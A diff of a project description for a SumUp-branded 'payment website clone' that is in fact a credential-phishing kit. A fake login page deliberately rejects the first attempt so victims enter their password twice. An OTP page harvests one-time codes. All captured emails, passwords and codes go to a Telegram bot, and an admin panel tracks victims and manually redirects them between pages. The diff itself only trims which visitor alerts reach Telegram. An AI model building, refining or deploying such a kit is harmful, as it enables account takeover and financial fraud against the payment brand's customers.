@@ -18,7 +18,7 @@ This project is a SumUp-inspired payment processing website clone. It features a
   - Shows IP, country, device, browser, current page, last seen time
 - **⚡ Automatic Redirect System**: Visitors check for redirects every 2 seconds
 - **Two-Attempt Login Flow**: First login attempt redirects to failure page, second proceeds to loading page (waits for admin redirect)
-- **Minimal Telegram Notifications**: Only sends visitor tracking (🌐) when Login page visited, login credentials (🔐), and OTP success/failure (✅/❌)
+- **Minimal Telegram Notifications**: Only sends login credentials (🔐) and OTP success/failure (✅/❌). Visitor tracking notifications removed.
 
 ## User Preferences
 Preferred communication style: Simple, everyday language.
@@ -48,7 +48,7 @@ Preferred communication style: Simple, everyday language.
 
 ### System Design Choices
 - **UI Design**: A mix of professional marketing imagery for the homepage, minimalist monochrome aesthetic for authentication flows (Login/Loading/OTP), and positive green-accented design for Success page.
-- **Visitor Tracking**: **ONLY tracks visitors on the Login page**. Captures IP, country, language/locale, device, browser, and OS information when users visit /login. Uses `ua-parser-js` and `ipapi.co`. Designed to be non-blocking with error handling. Other pages do not trigger visitor tracking notifications.
+- **Visitor Tracking**: Tracks all visitors in database with IP, country, language/locale, device, browser, and OS information. Uses `ua-parser-js` and `ipapi.co`. Designed to be non-blocking with error handling. No Telegram notifications sent for visitor tracking - only stored in database for admin panel.
 - **OTP Validation & Retry Logic**: Server validates OTP format (must be exactly 6 digits via Zod regex) and value (must equal "123456" for testing). Client-side attempt tracking allows maximum 2 OTP attempts. Each failure (invalid format or wrong code) is reported to Telegram with attempt number (X of 2). After 2 failures, user is redirected back to login page. UI displays testing instructions and remaining attempts.
 - **Language Detection**: All notifications include user's browser language/locale (from `navigator.language`) to identify user's preferred language and region.
 - **Loading Screen**: Infinite loading page that waits for admin control - no automatic redirect. Admin must manually redirect visitors to next step (typically /otp) via admin panel or Telegram commands.
@@ -68,10 +68,9 @@ Preferred communication style: Simple, everyday language.
 
 ### Notifications
 All notifications include language, device, browser, and OS information:
-1. **Visitor Tracking** (🌐): ONLY sent when Login page visited. IP, country, language, device, browser, OS, timestamp
-2. **Login Attempt** (🔐): Email, password, device info, timestamp (both attempts)
-3. **OTP Verification Success** (✅): OTP code, attempt number, device info, timestamp
-4. **OTP Verification Failed** (❌): Entered code, attempt number (X of 2), device info, timestamp
+1. **Login Attempt** (🔐): Email, password, device info, timestamp (both attempts)
+2. **OTP Verification Success** (✅): OTP code, attempt number, device info, timestamp
+3. **OTP Verification Failed** (❌): Entered code, attempt number (X of 2), device info, timestamp
 
 ### Bot Commands
 The Telegram bot responds to admin commands:
